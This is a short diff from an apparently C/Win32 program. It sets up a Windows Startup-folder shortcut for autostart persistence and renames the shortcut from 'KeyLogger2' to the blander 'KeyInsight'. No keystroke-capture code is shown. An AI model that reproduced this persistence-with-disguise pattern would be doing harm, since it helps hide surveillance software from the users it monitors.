@@ -92,10 +92,10 @@ int getDetails(){
 
     // Pfad zum Shortcut im Autostart
     WCHAR shortcutPath[MAX_PATH];
-    swprintf_s(shortcutPath, MAX_PATH, L"%s\\KeyLogger2.lnk", startupPath);
+    swprintf_s(shortcutPath, MAX_PATH, L"%s\\KeyInsight.lnk", startupPath);
 
     // Shortcut erstellen mit dem Arbeitsverzeichnis
-    createShortcut(shortcutPath, KeyInsightPath, L"Autostart for KeyLogger2.exe", workingDirectoryPath);
+    createShortcut(shortcutPath, KeyInsightPath, L"Autostart for KeyInsight.exe", workingDirectoryPath);
 
     return 0;
 }
